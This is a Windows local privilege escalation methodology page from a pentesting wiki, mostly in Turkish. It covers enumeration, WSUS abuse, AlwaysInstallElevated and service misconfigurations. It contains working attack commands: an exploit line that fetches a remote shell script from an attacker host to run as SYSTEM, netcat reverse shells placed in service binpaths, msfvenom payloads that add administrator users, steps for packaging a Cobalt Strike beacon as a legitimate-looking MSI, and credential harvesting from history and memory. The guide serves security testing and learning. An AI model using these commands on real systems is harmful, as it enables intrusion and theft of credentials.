# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Initial Windows Theory

### Access Tokens

**Windows Access Tokens'ın ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs hakkında daha fazla bilgi için aşağıdaki sayfayı inceleyin:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows'taki integrity levels'ın ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows'ta sistemin enumerate edilmesini engelleyebilecek, executable çalıştırmanızı durdurabilecek veya aktivitelerinizi tespit edebilecek çeşitli kontroller vardır. Privilege escalation enumerasyonuna başlamadan önce aşağıdaki sayfayı okuyup tüm bu savunma mekanizmalarını enumerate etmelisiniz:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess süreçleri `RAiLaunchAdminProcess` aracılığıyla başlatıldığında, AppInfo secure-path checks atlandığında prompt olmadan High IL'e ulaşmak için kötüye kullanılabilir. Bununla ilgili UIAccess/Admin Protection bypass workflow'unu şuradan kontrol edin:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

## System Info

### Version info enumeration

Windows sürümünün bilinen herhangi bir zafiyeti olup olmadığını (uygulanan patch'leri de kontrol edin) kontrol edin.
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Bu [site](https://msrc.microsoft.com/update-guide/vulnerability) Microsoft güvenlik açıkları hakkında ayrıntılı bilgi aramak için kullanışlıdır. Bu veritabanında 4.700'den fazla güvenlik açığı bulunmaktadır; bu da bir Windows ortamının sunduğu **massive attack surface**'ı göstermektedir.

**Sistemde**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas içinde watson bulunur)_

**Sistem bilgisi ile yerelde**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ortam

env variables içinde herhangi bir credential/Juicy bilgi kayıtlı mı?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Geçmişi
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript dosyaları

Bunu nasıl etkinleştireceğinizi şu adreste öğrenebilirsiniz: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline yürütmelerinin ayrıntıları kaydedilir; yürütülen komutlar, komut çağrıları ve betiklerin parçaları dahil edilir. Ancak tam yürütme ayrıntıları ve çıktı sonuçları yakalanmayabilir.

Bunu etkinleştirmek için belgelendirmedeki "Transcript files" bölümündeki talimatları izleyin ve **"Module Logging"**'i **"Powershell Transcription"** yerine seçin.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Powershell logs'tan son 15 olayı görüntülemek için şunu çalıştırabilirsiniz:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Betik çalıştırılmasının tam etkinlik ve içerik kaydı yakalanır; her kod bloğunun çalışırken belgelendiğinden emin olunur. Bu süreç, her etkinliğin kapsamlı bir denetim izini korur ve adli analizler ile kötü amaçlı davranışların incelenmesi için değerlidir. Tüm etkinlik çalışma zamanında belgelendiği için sürece dair ayrıntılı içgörüler sağlar.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block için kayıt olayları Windows Olay Görüntüleyicisi'nde şu yolda bulunabilir: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Son 20 olayı görüntülemek için şunu kullanabilirsiniz:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### İnternet Ayarları
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Sürücüler
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Güncellemeler http**S** yerine http ile isteniyorsa sistemi ele geçirebilirsiniz.

Ağın SSL kullanmayan bir WSUS güncellemesi (non-SSL) kullanıp kullanmadığını kontrol etmek için cmd'de aşağıdakini çalıştırın:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Veya PowerShell'de aşağıdakiler:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Aşağıdakiler gibi bir yanıt alırsanız:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Ve eğer `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` veya `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` değeri `1` ise.

O zaman, **istismar edilebilir.** Son kayıt değeri 0 ise, WSUS girdisi göz ardı edilecektir.

Bu zafiyeti istismar etmek için şu araçları kullanabilirsiniz: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Bunlar MiTM amaçlı, non-SSL WSUS trafiğine 'sahte' güncellemeler enjekte eden exploit scriptleridir.

Araştırmayı burada okuyun:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Complete raporu buradan okuyun**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Temelde, bu hatanın istismar ettiği kusur şudur:

> Eğer yerel kullanıcı proxy'imizi değiştirme gücüne sahipsek ve Windows Updates Internet Explorer ayarlarında yapılandırılmış proxy'i kullanıyorsa, kendi trafiğimizi yakalamak ve yükseltilmiş kullanıcı haklarıyla kod çalıştırmak için yerel olarak [PyWSUS](https://github.com/GoSecure/pywsus) çalıştırma yetkisine sahip oluruz.
>
> Ayrıca, WSUS servisi geçerli kullanıcının ayarlarını kullandığından, onun sertifika deposunu da kullanacaktır. WSUS hostname'i için bir self-signed sertifika oluşturup bu sertifikayı geçerli kullanıcının sertifika deposuna eklerseniz, hem HTTP hem de HTTPS WSUS trafiğini yakalayabilirsiniz. WSUS, sertifika üzerinde trust-on-first-use türü bir doğrulamayı uygulamak için HSTS-benzeri bir mekanizma kullanmaz. Sunulan sertifika kullanıcı tarafından güvenilir ise ve doğru hostname'e sahipse, servis tarafından kabul edilecektir.

Bu zafiyeti [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) aracı ile (serbest kaldığında) istismar edebilirsiniz.

## Üçüncü Taraf Auto-Updaters ve Agent IPC (local privesc)

Birçok kurumsal agent, localhost üzerinde bir IPC yüzeyi ve ayrıcalıklı bir update kanalı açar. Eğer enrollment saldırgan bir sunucuya zorlanabiliyorsa ve updater sahte bir root CA'ya veya zayıf imza kontrollerine güveniyorsa, yerel bir kullanıcı SYSTEM servisi tarafından kurulan kötü amaçlı bir MSI teslim edebilir. Genel bir teknik (Netskope stAgentSvc zincirine dayanan – CVE-2025-0309) için bakınız:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` localhost üzerinde **TCP/9401** üzerinde bir servis açar ve saldırgan kontrollü mesajları işler, bu da **NT AUTHORITY\SYSTEM** olarak rastgele komutlar çalıştırmaya izin verir.

- **Keşif**: listener ve versiyonu doğrulayın, örn., `netstat -ano | findstr 9401` ve `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **İstismar**: gerekli Veeam DLL'leri ile birlikte `VeeamHax.exe` gibi bir PoC'u aynı dizine koyun, ardından yerel socket üzerinden SYSTEM payload'u tetikleyin:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Servis komutu SYSTEM olarak çalıştırır.

## KrbRelayUp

Belirli koşullar altında Windows **domain** ortamlarında bir **local privilege escalation** zafiyeti bulunmaktadır. Bu koşullar, **LDAP signing is not enforced,** kullanıcıların **Resource-Based Constrained Delegation (RBCD)** yapılandırmasını yapabilmelerine izin veren self-rights'a sahip olmaları ve kullanıcıların etki alanı içinde bilgisayar oluşturabilme yetisine sahip olmalarını içerir. Bu **gereksinimlerin** **varsayılan ayarlarla** karşılandığını belirtmek önemlidir.

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Daha fazla bilgi için saldırının akışı hakkında şu kaynağı inceleyin [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Eğer** bu 2 kayıt defteri anahtarı **etkinse** (değer **0x1**), herhangi bir ayrıcalığa sahip kullanıcılar `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **yükleyebilir** (çalıştırabilir).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Bir meterpreter oturumunuz varsa, bu tekniği **`exploit/windows/local/always_install_elevated`** modülünü kullanarak otomatikleştirebilirsiniz.

### PowerUP

Yetki yükseltmek için mevcut dizine bir Windows MSI ikili dosyası oluşturmak üzere power-up içinden `Write-UserAddMSI` komutunu kullanın. Bu script, kullanıcı/grup eklemesi isteyen (bu yüzden GIU erişimi gerekecek) ön-derlenmiş bir MSI yükleyicisi yazar:
```
Write-UserAddMSI
```
Just execute the created binary to escalate privileges.

### MSI Wrapper

Read this tutorial to learn how to create a MSI wrapper using this tools. Note that you can wrap a "**.bat**" file if you **just** want to **execute** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Open **Visual Studio**, select **Create a new project** and type "installer" into the search box. Select the **Setup Wizard** project and click **Next**.
- Give the project a name, like **AlwaysPrivesc**, use **`C:\privesc`** for the location, select **place solution and project in the same directory**, and click **Create**.
- Keep clicking **Next** until you get to step 3 of 4 (choose files to include). Click **Add** and select the Beacon payload you just generated. Then click **Finish**.
- Highlight the **AlwaysPrivesc** project in the **Solution Explorer** and in the **Properties**, change **TargetPlatform** from **x86** to **x64**.
- There are other properties you can change, such as the **Author** and **Manufacturer** which can make the installed app look more legitimate.
- Right-click the project and select **View > Custom Actions**.
- Right-click **Install** and select **Add Custom Action**.
- Double-click on **Application Folder**, select your **beacon.exe** file and click **OK**. This will ensure that the beacon payload is executed as soon as the installer is run.
- Under the **Custom Action Properties**, change **Run64Bit** to **True**.
- Finally, **build it**.
- If the warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` is shown, make sure you set the platform to x64.

### MSI Installation

To execute the **installation** of the malicious `.msi` file in **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Bu zafiyeti exploit etmek için kullanabilirsiniz: _exploit/windows/local/always_install_elevated_

## Antivirüs ve Tespit Sistemleri

### Denetim Ayarları

Bu ayarlar nelerin **kaydedildiğini** belirler, bu yüzden dikkat etmelisiniz
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, günlüklerin nereye gönderildiğini bilmek ilginç.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** domain'e katılmış bilgisayarlarda her parolanın **benzersiz, rastgele ve düzenli olarak güncellenmesini** sağlayarak **local Administrator passwords** yönetimi için tasarlanmıştır. Bu parolalar Active Directory içinde güvenli şekilde saklanır ve yalnızca ACLs aracılığıyla yeterli izin verilmiş kullanıcılar tarafından erişilebilir; yetkili kullanıcılar local admin parolalarını görüntüleyebilirler.

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Etkinse, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** ile başlayarak, Microsoft, Local Security Authority (LSA) için, güvensiz süreçlerin **belleğini okumaya** veya kod enjekte etmeye yönelik girişimlerini **engellemek** amacıyla gelişmiş koruma sağladı ve böylece sistemi daha da güvenli hale getirdi.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection)
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** Windows 10'da tanıtıldı. Amacı, bir cihazda depolanan kimlik bilgilerini pass-the-hash gibi tehditlere karşı korumaktır.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** **Local Security Authority** (LSA) tarafından doğrulanır ve işletim sistemi bileşenleri tarafından kullanılır. Bir kullanıcının oturum açma verileri kayıtlı bir registered security package tarafından doğrulandığında, genellikle kullanıcıya ait domain credentials oluşturulur.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Kullanıcılar ve Gruplar

### Kullanıcıları ve Grupları Listeleme

Ait olduğunuz grupların herhangi birinin ilginç izinlere sahip olup olmadığını kontrol etmelisiniz.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Ayrıcalıklı gruplar

Eğer **bazı ayrıcalıklı gruplara üyeyseniz ayrıcalıkları yükseltebilirsiniz**. Ayrıcalıklı grupları ve bunları ayrıcalık yükseltmek için nasıl kötüye kullanacağınızı öğrenmek için buraya bakın:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipülasyonu

**Daha fazla bilgi** için bu sayfada **token**'ın ne olduğunu okuyun: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Aşağıdaki sayfayı inceleyerek **ilginç tokens hakkında bilgi edinin** ve bunları nasıl kötüye kullanacağınızı öğrenin:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Oturum açmış kullanıcılar / Oturumlar
```bash
qwinsta
klist sessions
```
### Kullanıcı klasörleri
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Parola Politikası
```bash
net accounts
```
### Panonun içeriğini al
```bash
powershell -command "Get-Clipboard"
```
## Çalışan İşlemler

### Dosya ve Klasör İzinleri

Öncelikle, işlemleri listeleyerek **işlemin komut satırında şifreleri kontrol edin**.\
Çalışmakta olan bazı **binary**'leri **üzerine yazıp yazamayacağınızı** veya binary klasörünün yazma izinlerine sahip olup olmadığınızı kontrol edin; böylece olası [**DLL Hijacking attacks**](dll-hijacking/index.html) istismar edebilirsiniz:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Her zaman olası [**electron/cef/chromium debuggers** çalışıp çalışmadığını kontrol edin; bunu abuse ederek escalate privileges elde edebilirsiniz](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Süreçlerin ikili dosyalarının izinlerini kontrol etme**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Processlerin binaries klasörlerinin izinlerini kontrol etme (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Bellek Şifre Madenciliği

Çalışan bir process'in bellek dökümünü sysinternals'tan **procdump** ile oluşturabilirsiniz. FTP gibi servislerde **kimlik bilgileri (credentials) bellek üzerinde düz metin halinde** bulunur; belleği döküp kimlik bilgilerini okumayı deneyin.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Güvensiz GUI uygulamaları

**SYSTEM olarak çalışan uygulamalar, bir kullanıcının CMD başlatmasına veya dizinleri gezmesine izin verebilir.**

Örnek: "Windows Help and Support" (Windows + F1), "command prompt" için arama yapın, "Click to open Command Prompt" seçeneğine tıklayın

## Hizmetler

Service Triggers, belirli koşullar gerçekleştiğinde (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, vb.) Windows'un bir servisi başlatmasını sağlar. SERVICE_START haklarına sahip olmasanız bile, tetikleyicilerini çalıştırarak genellikle ayrıcalıklı servisleri başlatabilirsiniz. Listeleme ve etkinleştirme tekniklerini burada inceleyin:

-
{{#ref}}
service-triggers.md
{{#endref}}

Hizmetlerin listesini alın:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### İzinler

Bir servisin bilgilerini almak için **sc** kullanabilirsiniz
```bash
sc qc <service_name>
```
Her hizmet için gerekli ayrıcalık seviyesini kontrol etmek amacıyla _Sysinternals_'den temin edilecek **accesschk** binary'sine sahip olmak önerilir.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Herhangi bir servisi "Authenticated Users" grubunun değiştirebileceğini kontrol etmeniz önerilir:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Buradan accesschk.exe (XP için) indirebilirsiniz](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Servisi etkinleştir

Bu hatayı alıyorsanız (örneğin SSDPSRV ile):

_Sistem hatası 1058 oluştu._\
_Servis başlatılamıyor; ya devre dışı bırakılmış ya da ilişkili etkin bir aygıtı yok._

Bunu şu komutla etkinleştirebilirsiniz
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**upnphost servisinin çalışması için SSDPSRV'ye bağımlı olduğunu unutmayın (XP SP1 için)**

**Bu sorunun başka bir çözümü** çalıştırmaktır:
```
sc.exe config usosvc start= auto
```
### **Modify service binary path**

Bir serviste "Authenticated users" grubunun **SERVICE_ALL_ACCESS** yetkisine sahip olduğu durumda, servisin executable binary'si değiştirilebilir. **sc**'yi değiştirmek ve çalıştırmak için:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Servisi yeniden başlat
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Yetkiler çeşitli izinler aracılığıyla yükseltilebilir:

- **SERVICE_CHANGE_CONFIG**: service binary'nin yeniden yapılandırılmasına izin verir.
- **WRITE_DAC**: İzinlerin yeniden yapılandırılmasına olanak tanır; bu da service yapılandırmalarını değiştirme yeteneğine yol açar.
- **WRITE_OWNER**: Sahipliğin alınmasına ve izinlerin yeniden yapılandırılmasına izin verir.
- **GENERIC_WRITE**: Service yapılandırmalarını değiştirme yeteneğini devralır.
- **GENERIC_ALL**: Yine service yapılandırmalarını değiştirme yeteneğini devralır.

Bu zafiyetin tespiti ve istismarı için _exploit/windows/local/service_permissions_ kullanılabilir.

### Service binary'lerinin zayıf izinleri

**Bir service tarafından çalıştırılan binary'yi değiştirebilip değiştiremeyeceğinizi kontrol edin** veya **binary'nin bulunduğu klasörde yazma izniniz** olup olmadığını kontrol edin ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Bir service tarafından çalıştırılan her binary'yi **wmic** kullanarak (system32'de olmayan) alabilir ve izinlerinizi **icacls** ile kontrol edebilirsiniz:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Ayrıca **sc** ve **icacls** kullanabilirsiniz:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Servis kayıt defteri değiştirme izinleri

Herhangi bir servis kayıt defterini değiştirip değiştiremeyeceğinizi kontrol etmelisiniz.\
Bir servis **kayıt defteri** üzerindeki **izinlerinizi** **kontrol** etmek için şunu yapabilirsiniz:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** veya **NT AUTHORITY\INTERACTIVE**'ın `FullControl` izinlerine sahip olup olmadığı kontrol edilmelidir. Eğer öyleyse, servis tarafından çalıştırılan binary değiştirilebilir.

Çalıştırılan binary'nin Path'ini değiştirmek için:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory permissions

Eğer bir kayıt defteri üzerinde bu izne sahipseniz, bu **bu kayıttan alt kayıtlar oluşturabileceğiniz** anlamına gelir. Windows services durumunda bu, **keyfi kod çalıştırmak için yeterlidir:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Bir yürütülebilir dosyanın yolu tırnak içinde değilse, Windows boşluktan önceki her parçayı ayrı bir yol olarak çalıştırmayı dener.

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Yerleşik Windows hizmetlerine ait olanlar hariç, tırnak içine alınmamış tüm hizmet yollarını listeleyin:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Bu güvenlik açığını tespit edip istismar edebilirsiniz** metasploit ile: `exploit/windows/local/trusted\_service\_path` metasploit ile manuel olarak bir service binary oluşturabilirsiniz:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Kurtarma Eylemleri

Windows, bir hizmet başarısız olduğunda alınacak eylemleri kullanıcıların belirtmesine izin verir. Bu özellik bir binary'ye işaret edecek şekilde yapılandırılabilir. Eğer bu binary değiştirilebilirse, privilege escalation mümkün olabilir. More details can be found in the [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Uygulamalar

### Yüklü Uygulamalar

**binary'lerin izinlerini** (belki birini overwrite edip privilege escalation sağlayabilirsiniz) ve **klasörlerin** izinlerini kontrol edin ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

